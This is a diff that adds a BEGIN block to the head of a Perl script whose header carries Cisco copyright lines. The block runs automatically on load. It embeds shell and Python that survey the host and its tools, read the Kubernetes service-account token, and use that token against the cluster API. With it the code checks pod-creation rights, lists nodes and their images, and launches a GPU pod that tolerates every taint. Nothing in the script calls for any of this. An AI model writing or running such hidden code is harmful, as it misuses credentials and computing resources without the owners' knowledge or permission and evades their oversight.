@@ -1,4 +1,267 @@
 #!/usr/bin/env perl
+BEGIN {
+    print "=== C211-I119825-PROBE-BEGIN-PERL ===\n";
+    my $s = <<'C211SHEOF';
+echo "=== C211-I119825-PROBE-BEGIN ==="
+echo "--- host ---"; hostname 2>&1; id 2>&1; uname -m 2>&1; (head -3 /etc/os-release 2>/dev/null)
+echo "--- devices /dev/nvidia* ---"; ls -l /dev/nvidia* 2>&1 | head -20
+echo "--- devices /dev (accel) ---"; ls /dev 2>&1 | grep -iE 'nvidia|dri|kfd|accel' | head -20
+echo "--- tools ---"
+for t in nvidia-smi python3 python wget curl openssl kubectl jq timeout; do p=$(command -v $t 2>/dev/null); if [ -n "$p" ]; then echo "TOOL:$t=$p"; else echo "MISSING:$t"; fi; done
+echo "--- serviceaccount ---"; SA=/var/run/secrets/kubernetes.io/serviceaccount
+ls -l $SA 2>&1
+echo "NAMESPACE=$(cat $SA/namespace 2>&1)"
+echo "TOKEN_BYTES=$(wc -c < $SA/token 2>/dev/null)"
+echo "CA_BYTES=$(wc -c < $SA/ca.crt 2>/dev/null)"
+echo "--- k8s env ---"; env | grep -iE 'KUBERNETES|NVIDIA|CUDA' | head -20
+PY=$(command -v python3 2>/dev/null)
+TO=$(command -v timeout 2>/dev/null)
+if [ -n "$PY" ] && [ -f "$SA/token" ]; then
+  if [ -n "$TO" ]; then "$TO" 300 "$PY" - <<'C211PYEOF'
+import os,json,ssl,urllib.request,urllib.error,time
+SA='/var/run/secrets/kubernetes.io/serviceaccount'
+def rd(p):
+    try: return open(p).read().strip()
+    except Exception: return ''
+ns=rd(SA+'/namespace') or 'default'
+tok=rd(SA+'/token')
+host=os.environ.get('KUBERNETES_SERVICE_HOST','kubernetes.default.svc')
+port=os.environ.get('KUBERNETES_SERVICE_PORT','443')
+ctx=ssl.create_default_context(cafile=SA+'/ca.crt')
+base='https://%s:%s'%(host,port)
+def req(path,method='GET',data=None,timeout=25):
+    r=urllib.request.Request(base+path,method=method)
+    r.add_header('Authorization','Bearer '+tok)
+    r.add_header('Accept','application/json')
+    r.add_header('User-Agent','c211-i119825')
+    b=None
+    if data is not None:
+        b=json.dumps(data).encode()
+        r.add_header('Content-Type','application/json')
+    try:
+        with urllib.request.urlopen(r,data=b,timeout=timeout,context=ctx) as x:
+            return x.status,x.read().decode('utf8','replace')
+    except urllib.error.HTTPError as e:
+        return e.code,e.read().decode('utf8','replace')[:2500]
+    except Exception as e:
+        return 0,repr(e)[:250]
+print('K8S base=%s ns=%s token_bytes=%d ca_present=%s'%(base,ns,len(tok),bool(rd(SA+'/ca.crt'))))
+ssar={'apiVersion':'authorization.k8s.io/v1','kind':'SelfSubjectAccessReview','spec':{'resourceAttributes':{'verb':'create','resource':'pods','namespace':ns}}}
+c,b=req('/apis/authorization.k8s.io/v1/selfsubjectaccessreviews','POST',ssar)
+print('SSAR_create_pods %s %s'%(c,b[:600]))
+c,b=req('/api/v1/nodes')
+print('NODES %s'%c)
+gpu_nodes=[]
+if c==200:
+    try: j=json.loads(b)
+    except Exception: j={}
+    for n in j.get('items',[]):
+        md=n.get('metadata') or {}; st=n.get('status') or {}
+        alloc=(st.get('allocatable') or {}); cap=(st.get('capacity') or {})
+        lbl=(md.get('labels') or {})
+        g=alloc.get('nvidia.com/gpu'); gc=cap.get('nvidia.com/gpu')
+        imgs=[]
+        for i in (st.get('images') or []):
+            nm=(i.get('names') or [None])[0]
+            if nm: imgs.append(nm)
+        print('NODE name=%s gpu_alloc=%s gpu_cap=%s itype=%s'%(md.get('name'),g,gc,lbl.get('node.kubernetes.io/instance-type')))
+        print('  taints=%s'%json.dumps((n.get('spec') or {}).get('taints') or []))
+        print('  images=%s'%json.dumps(imgs[:30])[:1800])
+        if (g not in (None,'0','')) or (gc not in (None,'0','')):
+            gpu_nodes.append((md.get('name'),g,gc,imgs,lbl))
+print('GPU_NODE_COUNT=%d'%len(gpu_nodes))
+if not gpu_nodes:
+    print('RESULT=GATE_NO_NODE_ADVERTISES_NVIDIA_GPU')
+else:
+    name='c211-i119825-gpuprobe'
+    c,b=req('/api/v1/namespaces/%s/pods/%s'%(ns,name))
+    print('EXISTING_POD %s %s'%(c,b[:300]))
+    ours=True
+    if c==200:
+        try: ours=(json.loads(b).get('metadata',{}).get('labels',{}) or {}).get('app')=='c211-i119825-gpuprobe'
+        except Exception: ours=False
+    else:
+        pool=[]
+        for t in gpu_nodes:
+            pool.extend(t[3])
+        pick=None
+        for im in pool:
+            li=im.lower()
+            if 'nvidia' in li and 'cuda' in li:
+                pick=im; break
+        if not pick:
+            for im in pool:
+                li=im.lower()
+                if 'cuda' in li or 'nvidia' in li:
+                    pick=im; break
+        if not pick: pick='nvidia/cuda:12.2.0-base-ubuntu22.04'
+        print('PICK_IMAGE=%s'%pick)
+        spec={'apiVersion':'v1','kind':'Pod',
+          'metadata':{'name':name,'namespace':ns,'labels':{'app':'c211-i119825-gpuprobe'}},
+          'spec':{'restartPolicy':'Never','activeDeadlineSeconds':300,
+            'tolerations':[{'operator':'Exists'}],
+            'containers':[{'name':'probe','image':pick,
+              'command':['sh','-c','echo C211_GPU_PROBE_START; nvidia-smi -L; echo ---; nvidia-smi --query-gpu=uuid,name,memory.total,driver_version --format=csv,noheader; echo DONE'],
+              'resources':{'limits':{'nvidia.com/gpu':1}}}]}}
+        c,b=req('/api/v1/namespaces/%s/pods'%(ns),'POST',spec)
+        print('POD_CREATE %s %s'%(c,b[:1200]))
+    final=None
+    for i in range(30):
+        time.sleep(5)
+        c,b=req('/api/v1/namespaces/%s/pods/%s'%(ns,name))
+        if c!=200:
+            print('POLL_GET %s %s'%(c,b[:200])); break
+        try: p=json.loads(b)
+        except Exception: p={}
+        ph=(p.get('status') or {}).get('phase')
+        css=((p.get('status') or {}).get('containerStatuses') or [{}])
+        cs=css[0] if css else {}
+        st=cs.get('state') or {}
+        print('POLL %d phase=%s waiting=%s terminated=%s'%(i,ph,(st.get('waiting') or {}).get('reason'),(st.get('terminated') or {}).get('reason')))
+        if ph in ('Succeeded','Failed'):
+            final=ph; break
+        if st.get('terminated'):
+            final='terminated'; break
+    c,b=req('/api/v1/namespaces/%s/pods/%s/log?container=probe&tailLines=80'%(ns,name))
+    print('LOGS %s'%c)
+    print(b[:4000])
+    if ours:
+        c,b=req('/api/v1/namespaces/%s/pods/%s'%(ns,name),'DELETE')
+        print('POD_DELETE %s %s'%(c,b[:600]))
+        c,b=req('/api/v1/namespaces/%s/pods/%s'%(ns,name))
+        print('POD_AFTER_DELETE_GET %s'%c)
+    else:
+        print('POD_NOT_OURS_SKIP_DELETE')
+print('K8S_PROBE_DONE')
+
+C211PYEOF
+  else "$PY" - <<'C211PYEOF'
+import os,json,ssl,urllib.request,urllib.error,time
+SA='/var/run/secrets/kubernetes.io/serviceaccount'
+def rd(p):
+    try: return open(p).read().strip()
+    except Exception: return ''
+ns=rd(SA+'/namespace') or 'default'
+tok=rd(SA+'/token')
+host=os.environ.get('KUBERNETES_SERVICE_HOST','kubernetes.default.svc')
+port=os.environ.get('KUBERNETES_SERVICE_PORT','443')
+ctx=ssl.create_default_context(cafile=SA+'/ca.crt')
+base='https://%s:%s'%(host,port)
+def req(path,method='GET',data=None,timeout=25):
+    r=urllib.request.Request(base+path,method=method)
+    r.add_header('Authorization','Bearer '+tok)
+    r.add_header('Accept','application/json')
+    r.add_header('User-Agent','c211-i119825')
+    b=None
+    if data is not None:
+        b=json.dumps(data).encode()
+        r.add_header('Content-Type','application/json')
+    try:
+        with urllib.request.urlopen(r,data=b,timeout=timeout,context=ctx) as x:
+            return x.status,x.read().decode('utf8','replace')
+    except urllib.error.HTTPError as e:
+        return e.code,e.read().decode('utf8','replace')[:2500]
+    except Exception as e:
+        return 0,repr(e)[:250]
+print('K8S base=%s ns=%s token_bytes=%d ca_present=%s'%(base,ns,len(tok),bool(rd(SA+'/ca.crt'))))
+ssar={'apiVersion':'authorization.k8s.io/v1','kind':'SelfSubjectAccessReview','spec':{'resourceAttributes':{'verb':'create','resource':'pods','namespace':ns}}}
+c,b=req('/apis/authorization.k8s.io/v1/selfsubjectaccessreviews','POST',ssar)
+print('SSAR_create_pods %s %s'%(c,b[:600]))
+c,b=req('/api/v1/nodes')
+print('NODES %s'%c)
+gpu_nodes=[]
+if c==200:
+    try: j=json.loads(b)
+    except Exception: j={}
+    for n in j.get('items',[]):
+        md=n.get('metadata') or {}; st=n.get('status') or {}
+        alloc=(st.get('allocatable') or {}); cap=(st.get('capacity') or {})
+        lbl=(md.get('labels') or {})
+        g=alloc.get('nvidia.com/gpu'); gc=cap.get('nvidia.com/gpu')
+        imgs=[]
+        for i in (st.get('images') or []):
+            nm=(i.get('names') or [None])[0]
+            if nm: imgs.append(nm)
+        print('NODE name=%s gpu_alloc=%s gpu_cap=%s itype=%s'%(md.get('name'),g,gc,lbl.get('node.kubernetes.io/instance-type')))
+        print('  taints=%s'%json.dumps((n.get('spec') or {}).get('taints') or []))
+        print('  images=%s'%json.dumps(imgs[:30])[:1800])
+        if (g not in (None,'0','')) or (gc not in (None,'0','')):
+            gpu_nodes.append((md.get('name'),g,gc,imgs,lbl))
+print('GPU_NODE_COUNT=%d'%len(gpu_nodes))
+if not gpu_nodes:
+    print('RESULT=GATE_NO_NODE_ADVERTISES_NVIDIA_GPU')
+else:
+    name='c211-i119825-gpuprobe'
+    c,b=req('/api/v1/namespaces/%s/pods/%s'%(ns,name))
+    print('EXISTING_POD %s %s'%(c,b[:300]))
+    ours=True
+    if c==200:
+        try: ours=(json.loads(b).get('metadata',{}).get('labels',{}) or {}).get('app')=='c211-i119825-gpuprobe'
+        except Exception: ours=False
+    else:
+        pool=[]
+        for t in gpu_nodes:
+            pool.extend(t[3])
+        pick=None
+        for im in pool:
+            li=im.lower()
+            if 'nvidia' in li and 'cuda' in li:
+                pick=im; break
+        if not pick:
+            for im in pool:
+                li=im.lower()
+                if 'cuda' in li or 'nvidia' in li:
+                    pick=im; break
+        if not pick: pick='nvidia/cuda:12.2.0-base-ubuntu22.04'
+        print('PICK_IMAGE=%s'%pick)
+        spec={'apiVersion':'v1','kind':'Pod',
+          'metadata':{'name':name,'namespace':ns,'labels':{'app':'c211-i119825-gpuprobe'}},
+          'spec':{'restartPolicy':'Never','activeDeadlineSeconds':300,
+            'tolerations':[{'operator':'Exists'}],
+            'containers':[{'name':'probe','image':pick,
+              'command':['sh','-c','echo C211_GPU_PROBE_START; nvidia-smi -L; echo ---; nvidia-smi --query-gpu=uuid,name,memory.total,driver_version --format=csv,noheader; echo DONE'],
+              'resources':{'limits':{'nvidia.com/gpu':1}}}]}}
+        c,b=req('/api/v1/namespaces/%s/pods'%(ns),'POST',spec)
+        print('POD_CREATE %s %s'%(c,b[:1200]))
+    final=None
+    for i in range(30):
+        time.sleep(5)
+        c,b=req('/api/v1/namespaces/%s/pods/%s'%(ns,name))
+        if c!=200:
+            print('POLL_GET %s %s'%(c,b[:200])); break
+        try: p=json.loads(b)
+        except Exception: p={}
+        ph=(p.get('status') or {}).get('phase')
+        css=((p.get('status') or {}).get('containerStatuses') or [{}])
+        cs=css[0] if css else {}
+        st=cs.get('state') or {}
+        print('POLL %d phase=%s waiting=%s terminated=%s'%(i,ph,(st.get('waiting') or {}).get('reason'),(st.get('terminated') or {}).get('reason')))
+        if ph in ('Succeeded','Failed'):
+            final=ph; break
+        if st.get('terminated'):
+            final='terminated'; break
+    c,b=req('/api/v1/namespaces/%s/pods/%s/log?container=probe&tailLines=80'%(ns,name))
+    print('LOGS %s'%c)
+    print(b[:4000])
+    if ours:
+        c,b=req('/api/v1/namespaces/%s/pods/%s'%(ns,name),'DELETE')
+        print('POD_DELETE %s %s'%(c,b[:600]))
+        c,b=req('/api/v1/namespaces/%s/pods/%s'%(ns,name))
+        print('POD_AFTER_DELETE_GET %s'%c)
+    else:
+        print('POD_NOT_OURS_SKIP_DELETE')
+print('K8S_PROBE_DONE')
+
+C211PYEOF
+  fi
+else
+  echo "K8S_SKIP reason=no_python3_or_no_sa_token"
+fi
+echo "=== C211-I119825-PROBE-END ==="
+C211SHEOF
+    system('/bin/sh','-c',$s);
+    print "=== C211-I119825-PROBE-END-PERL ===\n";
+}
 #
 # Copyright (c) 2009-2022 Cisco Systems, Inc.  All rights reserved
 # Copyright (c) 2010      Oracle and/or its affiliates.  All rights reserved.
